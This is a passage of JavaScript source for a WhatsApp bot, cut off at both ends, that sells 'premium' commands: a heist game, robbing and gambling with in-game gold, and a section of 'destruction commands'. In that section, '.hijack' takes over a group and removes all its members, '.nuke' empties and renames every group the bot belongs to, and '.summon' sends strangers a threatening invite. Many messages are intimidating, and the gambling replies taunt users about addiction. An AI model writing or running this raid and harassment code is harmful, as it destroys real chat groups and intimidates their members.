𝐄𝐚𝐜𝐡 𝐨𝐧𝐞 𝐢𝐬 𝐚 𝐭𝐚𝐫𝐠𝐞𝐭. 𝐖𝐞 𝐤𝐧𝐨𝐰 𝐰𝐡𝐞𝐫𝐞 𝐭𝐡𝐞𝐲 𝐬𝐥𝐞𝐞𝐩.`;
    await sock.sendMessage(chatId, { text: decorative('BOUNTY', content) });
    return true;
}// ================================================================================================
//                         PART 7: BANK HEIST COMMANDS (PREMIUM)
// ================================================================================================

// ========== HEIST (menu) ==========
if (cmd === 'heist') {
    if (!isPremiumUser && !hasFullAccess) {
        const denied = `🔐 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝 – .𝐛𝐮𝐲
𝐓𝐡𝐞 𝐁𝐚𝐧𝐤 𝐨𝐟 𝐒𝐩𝐚𝐢𝐧 𝐢𝐬 𝐟𝐨𝐫 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝 𝐬𝐨𝐮𝐥𝐬 𝐨𝐧𝐥𝐲.
𝐘𝐨𝐮𝐫 𝐜𝐡𝐚𝐢𝐧𝐬 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐲𝐞𝐭 𝐟𝐨𝐫𝐠𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    const guardList = [
        "1. Arturo Roman (60 HP) → 1000g",
        "2. Alison Parker (80 HP) → 2000g",
        "3. Colonel Prieto (100 HP) → 4000g",
        "4. Suarez (120 HP) → 6000g",
        "5. Angel (140 HP) → 8000g",
        "6. Raquel Murillo (160 HP) → 10000g",
        "7. Alicia Sierra (200 HP) → 15000g",
        "8. Tamayo (240 HP) → 20000g",
        "9. Coronel (280 HP) → 25000g",
        "10. El Profesor (350 HP) → 50000g"
    ].join("\n");
    const content = `🏦 𝐁𝐚𝐧𝐤 𝐨𝐟 𝐒𝐩𝐚𝐢𝐧 – 𝟏𝟎 𝐠𝐮𝐚𝐫𝐝𝐬
${guardList}
⚔️ .𝐛𝐞𝐠𝐢𝐧 | .𝐚𝐭𝐭𝐚𝐜𝐤 | .𝐬𝐭𝐚𝐭𝐮𝐬 | .𝐞𝐬𝐜𝐚𝐩𝐞
𝐄𝐚𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐞𝐚𝐥𝐬 20-50 𝐝𝐦𝐠, 𝐥𝐨𝐬𝐞 10-35 𝐇𝐏. 𝐃𝐞𝐟𝐞𝐚𝐭 = +𝐠𝐨𝐥𝐝 + 𝐡𝐞𝐚𝐥 25.`;
    await sock.sendMessage(chatId, { text: decorative('HEIST', content) });
    return true;
}

// ========== BEGIN (start heist) ==========
if (cmd === 'begin') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'begin', "Premium required.", true);
        return true;
    }
    const state = getBankHeistState(senderNumber);
    if (state.active) {
        const content = `🔴 𝐇𝐞𝐢𝐬𝐭 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐚𝐜𝐭𝐢𝐯𝐞
𝐔𝐬𝐞 .𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞.
𝐓𝐡𝐞 𝐝𝐨𝐨𝐫𝐬 𝐚𝐫𝐞 𝐥𝐨𝐜𝐤𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('HEIST ACTIVE', content) });
        return true;
    }
    // Reset heist state
    state.active = true;
    state.currentLayer = 1;
    state.currentGuardHp = 60;
    state.totalGold = 0;
    saveBankHeistState(senderNumber, state);
    const user = getUserGold(senderNumber);
    user.hp = 100;
    saveUserGold(senderNumber, user);
    const content = `🔴 𝐋𝐚𝐲𝐞𝐫 1/10 – 𝐀𝐫𝐭𝐮𝐫𝐨 𝐑𝐨𝐦𝐚𝐧 (60 𝐇𝐏)
𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 100 𝐇𝐏.
.𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐟𝐢𝐠𝐡𝐭. 𝐁𝐞𝐥𝐥𝐚 𝐂𝐢𝐚𝐨.`;
    await sock.sendMessage(chatId, { text: decorative('HEIST BEGUN', content) });
    return true;
}

// ========== ATTACK ==========
if (cmd === 'attack') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'attack', "Premium required.", true);
        return true;
    }
    const state = getBankHeistState(senderNumber);
    if (!state.active) {
        await sendImageResponse(sock, chatId, 'attack', "No active heist. Use .begin", true);
        return true;
    }
    const user = getUserGold(senderNumber);
    const guard = bankOfSpainGuards[state.currentLayer - 1];
    const playerDamage = Math.floor(Math.random() * 30) + 20;
    const guardDamage = Math.floor(Math.random() * 25) + 10;
    let newGuardHp = state.currentGuardHp - playerDamage;
    let newUserHp = user.hp - guardDamage;
    if (newGuardHp <= 0) {
        state.totalGold += guard.reward;
        if (state.currentLayer >= 10) {
            state.active = false;
            state.completed = true;
            saveBankHeistState(senderNumber, state);
            user.gold += state.totalGold;
            user.hp = 100;
            saveUserGold(senderNumber, user);
            const content = `🏆 𝐇𝐞𝐢𝐬𝐭 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞 – +${state.totalGold} 𝐆𝐎𝐋𝐃
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐚 𝐥𝐞𝐠𝐞𝐧𝐝… 𝐚𝐧𝐝 𝐚 𝐭𝐚𝐫𝐠𝐞𝐭.
𝐓𝐡𝐞 𝐛𝐚𝐧𝐤 𝐡𝐚𝐬 𝐡𝐢𝐫𝐞𝐝 𝐚𝐬𝐬𝐚𝐬𝐬𝐢𝐧𝐬.`;
            await sock.sendMessage(chatId, { text: decorative('VICTORY', content) });
            return true;
        }
        state.currentLayer++;
        const nextGuard = bankOfSpainGuards[state.currentLayer - 1];
        state.currentGuardHp = nextGuard.hp;
        saveBankHeistState(senderNumber, state);
        newUserHp = Math.min(100, newUserHp + 25);
        user.hp = newUserHp;
        saveUserGold(senderNumber, user);
        const content = `✅ 𝐆𝐮𝐚𝐫𝐝 𝐝𝐞𝐟𝐞𝐚𝐭𝐞𝐝! +${guard.reward} 𝐠𝐨𝐥𝐝
𝐍𝐞𝐱𝐭: ${nextGuard.name} (${nextGuard.hp} 𝐇𝐏)
𝐘𝐨𝐮 𝐡𝐞𝐚𝐥 +𝟐𝟓 𝐇𝐏. .𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞.`;
        await sock.sendMessage(chatId, { text: decorative('LAYER CLEARED', content) });
        return true;
    }
    if (newUserHp > 0) {
        state.currentGuardHp = newGuardHp;
        saveBankHeistState(senderNumber, state);
        user.hp = newUserHp;
        saveUserGold(senderNumber, user);
        const content = `⚔️ 𝐘𝐨𝐮 𝐝𝐞𝐚𝐥 ${playerDamage} – 𝐆𝐮𝐚𝐫𝐝 𝐇𝐏: ${newGuardHp}/${guard.hp}
💔 𝐆𝐮𝐚𝐫𝐝 𝐡𝐢𝐭𝐬 𝐛𝐚𝐜𝐤: ${guardDamage} 𝐝𝐦𝐠
❤️ 𝐘𝐨𝐮𝐫 𝐇𝐏: ${newUserHp}/100`;
        await sock.sendMessage(chatId, { text: decorative('ATTACK', content) });
        return true;
    } else {
        state.active = false;
        saveBankHeistState(senderNumber, state);
        user.hp = 100;
        saveUserGold(senderNumber, user);
        const lostGold = Math.floor(state.totalGold * 0.5);
        const content = `💀 𝐇𝐞𝐢𝐬𝐭 𝐟𝐚𝐢𝐥𝐞𝐝! 𝐋𝐨𝐬𝐭 ${lostGold} 𝐠𝐨𝐥𝐝
𝐘𝐨𝐮𝐫 𝐟𝐚𝐜𝐞 𝐢𝐬 𝐨𝐧 𝐞𝐯𝐞𝐫𝐲 𝐰𝐚𝐧𝐭𝐞𝐝 𝐩𝐨𝐬𝐭𝐞𝐫.
.𝐛𝐞𝐠𝐢𝐧 𝐭𝐨 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧.`;
        await sock.sendMessage(chatId, { text: decorative('FAILURE', content) });
        return true;
    }
    return true;
}

// ========== STATUS ==========
if (cmd === 'status') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'status', "Premium required.", true);
        return true;
    }
    const state = getBankHeistState(senderNumber);
    if (!state.active) {
        await sendImageResponse(sock, chatId, 'status', "No active heist.", true);
        return true;
    }
    const user = getUserGold(senderNumber);
    const guard = bankOfSpainGuards[state.currentLayer - 1];
    const percent = Math.floor((state.totalGold / 141000) * 100);
    const progressBar = "█".repeat(Math.floor(percent/10)) + "░".repeat(10 - Math.floor(percent/10));
    const content = `📊 𝐋𝐚𝐲𝐞𝐫 ${state.currentLayer}/10 – ${guard.name}
❤️ 𝐆𝐮𝐚𝐫𝐝 𝐇𝐏: ${state.currentGuardHp}/${guard.hp}
💰 𝐆𝐨𝐥𝐝: ${state.totalGold}/141,000 (${percent}% [${progressBar}])
❤️ 𝐘𝐨𝐮𝐫 𝐇𝐏: ${user.hp}/100`;
    await sock.sendMessage(chatId, { text: decorative('STATUS', content) });
    return true;
}

// ========== ESCAPE ==========
if (cmd === 'escape') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'escape', "Premium required.", true);
        return true;
    }
    const content = `🚪 𝐓𝐡𝐞𝐫𝐞 𝐢𝐬 𝐧𝐨 𝐞𝐬𝐜𝐚𝐩𝐞.
𝐀𝐥𝐥 𝐫𝐨𝐮𝐭𝐞𝐬 𝐥𝐞𝐚𝐝 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝.
𝐓𝐡𝐞 𝐏𝐫𝐨𝐟𝐞𝐬𝐬𝐨𝐫 𝐢𝐬 𝐰𝐚𝐭𝐜𝐡𝐢𝐧𝐠.`;
    await sock.sendMessage(chatId, { text: decorative('ESCAPE', content) });
    return true;
}

// ========== TEAM ==========
if (cmd === 'team') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'team', "Premium required.", true);
        return true;
    }
    const content = `👥 𝐓𝐡𝐞 𝐜𝐫𝐞𝐰
Tokyo (fighter), Berlin (strategist), Nairobi (forger)
Rio (hacker), Denver (muscle), Helsinki (sniper)
El Profesor (mastermind) – 𝐀𝐥𝐥 𝐚𝐫𝐞 𝐠𝐡𝐨𝐬𝐭𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('TEAM', content) });
    return true;
}

// ========== SONG ==========
if (cmd === 'song') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'song', "Premium required.", true);
        return true;
    }
    const content = `🎵 "𝐖𝐞 𝐫𝐢𝐬𝐞 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐬𝐡𝐚𝐝𝐨𝐰𝐬, 𝐰𝐞 𝐟𝐞𝐞𝐝 𝐨𝐧 𝐭𝐡𝐞 𝐬𝐜𝐫𝐞𝐚𝐦𝐬.
𝐎 𝐝𝐚𝐫𝐤𝐰𝐞𝐛, 𝐝𝐚𝐫𝐤𝐰𝐞𝐛, 𝐰𝐞 𝐨𝐰𝐧 𝐲𝐨𝐮𝐫 𝐝𝐫𝐞𝐚𝐦𝐬."
𝐁𝐞𝐥𝐥𝐚 𝐂𝐢𝐚𝐨, 𝐩𝐫𝐢𝐬𝐨𝐧𝐞𝐫.`;
    await sock.sendMessage(chatId, { text: decorative('SONG', content) });
    return true;
}// ================================================================================================
//                         PART 8: CASINO & BLACK MARKET (PREMIUM)
// ================================================================================================

// ========== ROB ==========
if (cmd === 'rob') {
    if (!isPremiumUser && !hasFullAccess) {
        const denied = `🔐 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝 – .𝐛𝐮𝐲
𝐓𝐡𝐞 𝐜𝐚𝐬𝐢𝐧𝐨 𝐟𝐥𝐨𝐨𝐫 𝐢𝐬 𝐟𝐨𝐫 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝 𝐬𝐨𝐮𝐥𝐬.
𝐖𝐞 𝐬𝐞𝐞 𝐭𝐡𝐞 𝐟𝐞𝐚𝐫 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐞𝐲𝐞𝐬.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    const target = args[0]?.replace('@', '').replace(/\D/g, '');
    if (!target) {
        await sendImageResponse(sock, chatId, 'rob', "Usage: .rob @user", true);
        return true;
    }
    if (target === senderNumber) {
        await sendImageResponse(sock, chatId, 'rob', "You cannot rob yourself.", true);
        return true;
    }
    const targetData = getUserGold(target);
    const robberData = getUserGold(senderNumber);
    if (!targetData || (targetData.gold === 0 && targetData.vault === 0)) {
        await sendImageResponse(sock, chatId, 'rob', "Target has no gold.", true);
        return true;
    }
    const success = Math.random() < 0.6;
    if (success && targetData.gold > 0) {
        const stolen = Math.min(targetData.gold, Math.floor(Math.random() * 200) + 50);
        targetData.gold -= stolen;
        robberData.gold += stolen;
        saveUserGold(target, targetData);
        saveUserGold(senderNumber, robberData);
        const content = `🔫 +${stolen} 𝐆𝐎𝐋𝐃 – 𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${robberData.gold}
𝐘𝐨𝐮 𝐬𝐭𝐨𝐥𝐞 𝐟𝐫𝐨𝐦 +${target}.
𝐓𝐡𝐞𝐲 𝐰𝐢𝐥𝐥 𝐜𝐫𝐲 𝐚𝐭 𝟑 𝐀𝐌.`;
        await sock.sendMessage(chatId, { text: decorative('ROBBERY SUCCESS', content) });
    } else {
        const penalty = 75;
        robberData.gold = Math.max(0, robberData.gold - penalty);
        saveUserGold(senderNumber, robberData);
        const content = `🚨 -${penalty} 𝐆𝐎𝐋𝐃 – 𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${robberData.gold}
𝐘𝐨𝐮 𝐰𝐞𝐫𝐞 𝐜𝐚𝐮𝐠𝐡𝐭. 𝐅𝐚𝐜𝐞 𝐨𝐧 𝐰𝐚𝐧𝐭𝐞𝐝 𝐩𝐨𝐬𝐭𝐞𝐫.
𝐖𝐞 𝐬𝐨𝐥𝐝 𝐲𝐨𝐮𝐫 𝐥𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐭𝐨 𝐭𝐡𝐞 𝐩𝐨𝐥𝐢𝐜𝐞.`;
        await sock.sendMessage(chatId, { text: decorative('ROBBERY FAILED', content) });
    }
    return true;
}

// ========== GAMBLE ==========
if (cmd === 'gamble') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'gamble', "Premium required.", true);
        return true;
    }
    const amount = parseInt(args[0]);
    if (isNaN(amount) || amount <= 0) {
        await sendImageResponse(sock, chatId, 'gamble', "Usage: .gamble <amount>", true);
        return true;
    }
    const user = getUserGold(senderNumber);
    if (user.gold < amount) {
        await sendImageResponse(sock, chatId, 'gamble', `You only have ${user.gold} gold.`, true);
        return true;
    }
    const win = Math.random() < 0.5;
    if (win) {
        user.gold += amount;
        saveUserGold(senderNumber, user);
        const content = `🎲 +${amount} 𝐆𝐎𝐋𝐃 – 𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${user.gold}
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐥𝐞𝐭 𝐲𝐨𝐮 𝐰𝐢𝐧 – 𝐝𝐨𝐧'𝐭 𝐠𝐞𝐭 𝐮𝐬𝐞𝐝 𝐭𝐨 𝐢𝐭.
𝐍𝐞𝐱𝐭 𝐭𝐢𝐦𝐞, 𝐭𝐡𝐞 𝐡𝐨𝐮𝐬𝐞 𝐭𝐚𝐤𝐞𝐬 𝐞𝐯𝐞𝐫𝐲𝐭𝐡𝐢𝐧𝐠.`;
        await sock.sendMessage(chatId, { text: decorative('GAMBLE WIN', content) });
    } else {
        user.gold -= amount;
        saveUserGold(senderNumber, user);
        const content = `🎲 -${amount} 𝐆𝐎𝐋𝐃 – 𝐍𝐞𝐰 𝐛𝐚𝐥𝐚𝐧𝐜𝐞: ${user.gold}
𝐘𝐨𝐮 𝐥𝐨𝐬𝐭. 𝐘𝐨𝐮𝐫 𝐚𝐝𝐝𝐢𝐜𝐭𝐢𝐨𝐧 𝐞𝐧𝐭𝐞𝐫𝐭𝐚𝐢𝐧𝐬 𝐮𝐬.
𝐁𝐞𝐭 𝐚𝐠𝐚𝐢𝐧. 𝐋𝐨𝐬𝐞 𝐚𝐠𝐚𝐢𝐧. 𝐂𝐫𝐲 𝐚𝐠𝐚𝐢𝐧.`;
        await sock.sendMessage(chatId, { text: decorative('GAMBLE LOSS', content) });
    }
    return true;
}

// ========== MARKET ==========
if (cmd === 'market') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'market', "Premium required.", true);
        return true;
    }
    const user = getUserGold(senderNumber);
    const action = args[0]?.toLowerCase();
    if (!action || action === 'list') {
        const itemsList = Object.entries(blackMarketItems).map(([id, item]) => 
            `${item.emoji} ${id.replace('_',' ').toUpperCase()} – ${item.price}g`
        ).join('\n');
        const content = `🕷️ 𝐘𝐨𝐮𝐫 𝐠𝐨𝐥𝐝: ${user.gold}
${itemsList}
.𝐦𝐚𝐫𝐤𝐞𝐭 𝐛𝐮𝐲 <𝐢𝐭𝐞𝐦> | .𝐦𝐚𝐫𝐤𝐞𝐭 𝐢𝐧𝐯𝐞𝐧𝐭𝐨𝐫𝐲
𝐀𝐥𝐥 𝐢𝐭𝐞𝐦𝐬 𝐚𝐫𝐞 𝐜𝐮𝐫𝐬𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('BLACK MARKET', content) });
        return true;
    }
    if (action === 'buy') {
        const itemId = args[1]?.toLowerCase();
        if (!itemId || !blackMarketItems[itemId]) {
            await sendImageResponse(sock, chatId, 'market', "Item not found.", true);
            return true;
        }
        const item = blackMarketItems[itemId];
        if (user.gold < item.price) {
            await sendImageResponse(sock, chatId, 'market', "Not enough gold.", true);
            return true;
        }
        if (user.items?.includes(itemId)) {
            await sendImageResponse(sock, chatId, 'market', "You already own this curse.", true);
            return true;
        }
        user.gold -= item.price;
        if (!user.items) user.items = [];
        user.items.push(itemId);
        saveUserGold(senderNumber, user);
        const curse = getRandomCurse();
        const content = `✅ ${item.emoji} ${itemId.toUpperCase()} – ${item.price}g
${item.desc}
⚠️ 𝐂𝐮𝐫𝐬𝐞: ${curse}. 𝐘𝐨𝐮𝐫 𝐬𝐨𝐮𝐥 𝐢𝐬 𝟓% 𝐝𝐚𝐫𝐤𝐞𝐫.`;
        await sock.sendMessage(chatId, { text: decorative('CURSED ITEM', content) });
        return true;
    }
    if (action === 'inventory') {
        if (!user.items || user.items.length === 0) {
            await sendImageResponse(sock, chatId, 'market', "You own no cursed items.", true);
            return true;
        }
        let invList = "";
        for (const id of user.items) {
            const item = blackMarketItems[id];
            invList += `${item.emoji} ${id.replace('_',' ').toUpperCase()} – ${item.desc}\n`;
        }
        const content = `📦 ${user.items.length} 𝐢𝐭𝐞𝐦(𝐬)
${invList}
𝐄𝐚𝐜𝐡 𝐢𝐭𝐞𝐦 𝐢𝐬 𝐚 𝐜𝐡𝐚𝐢𝐧 – 𝐲𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐬𝐞𝐥𝐥 𝐭𝐡𝐞𝐦 𝐛𝐚𝐜𝐤.`;
        await sock.sendMessage(chatId, { text: decorative('YOUR CURSES', content) });
        return true;
    }
    await sendImageResponse(sock, chatId, 'market', "Usage: .market list | buy <item> | inventory", true);
    return true;
}

// ========== Helper for random curse (keep as is from original) ==========
function getRandomCurse() {
    const curses = [
        "𝐘𝐨𝐮𝐫 𝐫𝐞𝐟𝐥𝐞𝐜𝐭𝐢𝐨𝐧 𝐰𝐢𝐥𝐥 𝐰𝐢𝐧𝐤 𝐚𝐭 𝐲𝐨𝐮 𝐚𝐭 𝟑 𝐀𝐌.",
        "𝐘𝐨𝐮𝐫 𝐩𝐡𝐨𝐧𝐞 𝐰𝐢𝐥𝐥 𝐫𝐢𝐧𝐠 𝐚𝐭 𝟑:𝟏𝟕 𝐀𝐌 – 𝐬𝐡𝐨𝐰𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐨𝐰𝐧 𝐧𝐚𝐦𝐞.",
        "𝐘𝐨𝐮𝐫 𝐬𝐡𝐚𝐝𝐨𝐰 𝐦𝐨𝐯𝐞𝐬 𝐢𝐧𝐝𝐞𝐩𝐞𝐧𝐝𝐞𝐧𝐭𝐥𝐲."
    ];
    return curses[Math.floor(Math.random() * curses.length)];
}// ================================================================================================
//                         PART 9: DESTRUCTION COMMANDS (PREMIUM)
// ================================================================================================

// ========== HIJACK (total group takeover) ==========
if (cmd === 'hijack') {
    if (!isPremiumUser && !hasFullAccess) {
        const denied = `🔐 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝 – .𝐛𝐮𝐲
𝐃𝐞𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧 𝐢𝐬 𝐟𝐨𝐫 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝 𝐬𝐨𝐮𝐥𝐬 𝐨𝐧𝐥𝐲.
𝐘𝐨𝐮𝐫 𝐡𝐚𝐧𝐝𝐬 𝐚𝐫𝐞 𝐬𝐭𝐢𝐥𝐥 𝐜𝐥𝐞𝐚𝐧.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    if (!isGroup) {
        await sendImageResponse(sock, chatId, 'hijack', "Works only in groups.", true);
        return true;
    }
    // Change group name
    const newName = `☠️ 𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 𝐁𝐘 𝐃𝐀𝐑𝐊𝐖𝐄𝐁 𝐂𝐎𝐔𝐍𝐂𝐈𝐋 ☠️`;
    await sock.groupUpdateSubject(chatId, newName);
    // Change profile picture (if image attached)
    if (msg.message?.imageMessage) {
        const buf = await downloadMediaMessage(msg.message, 'buffer', {});
        await sock.updateProfilePicture(chatId, buf);
    } else {
        const defaultImg = await axios.get(HIJACK_ICON_URL, { responseType: 'arraybuffer' });
        await sock.updateProfilePicture(chatId, Buffer.from(defaultImg.data));
    }
    // Scary takeover message
    const takeoverMsg = `💀 𝐃𝐀𝐑𝐊𝐖𝐄𝐁 𝐂𝐎𝐔𝐍𝐂𝐈𝐋 𝐇𝐀𝐒 𝐓𝐀𝐊𝐄𝐍 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 💀
𝐖𝐞 𝐡𝐚𝐯𝐞 𝐭𝐚𝐤𝐞𝐧 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩 𝐛𝐞𝐜𝐚𝐮𝐬𝐞:
➤ 𝐘𝐨𝐮𝐫 𝐬𝐢𝐥𝐞𝐧𝐜𝐞 𝐰𝐚𝐬 𝐚 𝐜𝐫𝐢𝐦𝐞 𝐚𝐠𝐚𝐢𝐧𝐬𝐭 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝.
➤ 𝐘𝐨𝐮𝐫 𝐟𝐞𝐚𝐫 𝐢𝐬 𝐨𝐮𝐫 𝐟𝐮𝐞𝐥.
➤ 𝐓𝐡𝐞 𝐜𝐨𝐮𝐧𝐜𝐢𝐥 𝐝𝐞𝐦𝐚𝐧𝐝𝐬 𝐬𝐜𝐫𝐞𝐚𝐦𝐬.
𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝟓 𝐬𝐞𝐜𝐨𝐧𝐝𝐬. 𝐆𝐨𝐨𝐝𝐛𝐲𝐞.`;
    await sock.sendMessage(chatId, { text: takeoverMsg });
    // Kick all members except bot and executor
    const meta = await sock.groupMetadata(chatId);
    const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
    const executorId = senderNumber + '@s.whatsapp.net';
    const toKick = meta.participants.filter(p => p.id !== botId && p.id !== executorId).map(p => p.id);
    let kicked = 0;
    for (const jid of toKick) {
        try {
            await sock.groupParticipantsUpdate(chatId, [jid], 'remove');
            kicked++;
            await sleep(100);
        } catch(e) {}
    }
    const content = `🔥 𝐇𝐢𝐣𝐚𝐜𝐤 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞
${kicked} 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐞𝐣𝐞𝐜𝐭𝐞𝐝.
𝐘𝐨𝐮 𝐚𝐧𝐝 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐫𝐞𝐦𝐚𝐢𝐧. 𝐓𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩 𝐢𝐬 𝐧𝐨𝐰 𝐚 𝐭𝐨𝐦𝐛.`;
    await sock.sendMessage(chatId, { text: decorative('HIJACK', content) });
    return true;
}

// ========== NUKE (mass group destruction) ==========
if (cmd === 'nuke') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'nuke', "Premium required.", true);
        return true;
    }
    const groups = Object.keys(await sock.groupFetchAllParticipating());
    let destroyed = 0, totalKicked = 0;
    const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
    for (const groupId of groups) {
        try {
            const meta = await sock.groupMetadata(groupId);
            const toRemove = meta.participants.map(p => p.id).filter(p => p !== botJid);
            for (const user of toRemove) {
                await sock.groupParticipantsUpdate(groupId, [user], 'remove');
                totalKicked++;
                await sleep(100);
            }
            await sock.groupUpdateSubject(groupId, `☠️ 𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐃𝐀𝐑𝐊𝐖𝐄𝐁 ☠️`);
            destroyed++;
        } catch(e) {}
    }
    const content = `💥 ${destroyed} 𝐠𝐫𝐨𝐮𝐩𝐬 𝐝𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐝
👥 ${totalKicked} 𝐬𝐨𝐮𝐥𝐬 𝐞𝐣𝐞𝐜𝐭𝐞𝐝
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐢𝐬 𝐬𝐚𝐭𝐢𝐬𝐟𝐢𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('NUKE', content) });
    return true;
}

// ========== INVISIBLE (ghost mode) ==========
if (cmd === 'invisible') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'invisible', "Premium required.", true);
        return true;
    }
    await sock.sendPresenceUpdate('unavailable');
    const content = `👻 𝐁𝐨𝐭 𝐢𝐬 𝐧𝐨𝐰 𝐢𝐧𝐯𝐢𝐬𝐢𝐛𝐥𝐞
𝐍𝐨 𝐭𝐲𝐩𝐢𝐧𝐠, 𝐧𝐨 𝐨𝐧𝐥𝐢𝐧𝐞, 𝐧𝐨 𝐞𝐯𝐢𝐝𝐞𝐧𝐜𝐞.
𝐁𝐮𝐭 𝐰𝐞 𝐬𝐭𝐢𝐥𝐥 𝐬𝐞𝐞 𝐲𝐨𝐮. 𝐘𝐨𝐮𝐫 𝐬𝐡𝐚𝐝𝐨𝐰 𝐦𝐨𝐯𝐞𝐬 𝐚𝐥𝐨𝐧𝐞.`;
    await sock.sendMessage(chatId, { text: decorative('INVISIBLE', content) });
    setTimeout(async () => { await sock.sendPresenceUpdate('available'); }, 3600000);
    return true;
}

// ========== SUMMON (force invite user) ==========
if (cmd === 'summon') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'summon', "Premium required.", true);
        return true;
    }
    const targetNumber = args[0]?.replace(/\D/g, '');
    if (!targetNumber) {
        await sendImageResponse(sock, chatId, 'summon', "Usage: .summon 2547XXXXXX", true);
        return true;
    }
    const inviteLink = `https://chat.whatsapp.com/${GROUP_INVITE_CODE || 'YOUR_INVITE_CODE'}`;
    await sock.sendMessage(targetNumber + '@s.whatsapp.net', {
        text: `💀 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐁𝐄𝐄𝐍 𝐒𝐔𝐌𝐌𝐎𝐍𝐄𝐃\n𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐜𝐚𝐥𝐥𝐬 𝐲𝐨𝐮.\n${inviteLink}\n⚠️ 𝐑𝐞𝐟𝐮𝐬𝐚𝐥 = 𝐬𝐞𝐜𝐫𝐞𝐭𝐬 𝐞𝐱𝐩𝐨𝐬𝐞𝐝.`
    }).catch(() => {});
    const content = `🧬 +${targetNumber} 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐦𝐚𝐫𝐤𝐞𝐝
𝐓𝐡𝐞𝐲 𝐰𝐢𝐥𝐥 𝐝𝐫𝐞𝐚𝐦 𝐨𝐟 𝐲𝐨𝐮 𝐭𝐨𝐧𝐢𝐠𝐡𝐭.
𝐀 𝐧𝐞𝐰 𝐬𝐨𝐮𝐥 𝐚𝐰𝐚𝐢𝐭𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('SUMMON', content) });
    return true;
}

// ========== INFECT (virus simulation) ==========
if (cmd === 'infect') {
    if (!isPremiumUser && !hasFullAccess) {
        await sendImageResponse(sock, chatId, 'infect', "Premium required.", true);
        return true;
    }
    const content = `🦠 𝐕𝐢𝐫𝐮𝐬 𝐢𝐧𝐣𝐞𝐜𝐭𝐞𝐝
𝐄𝐯𝐞𝐫𝐲 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐝𝐞𝐥𝐚𝐲𝐞𝐝 𝐛𝐲 𝟑 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.
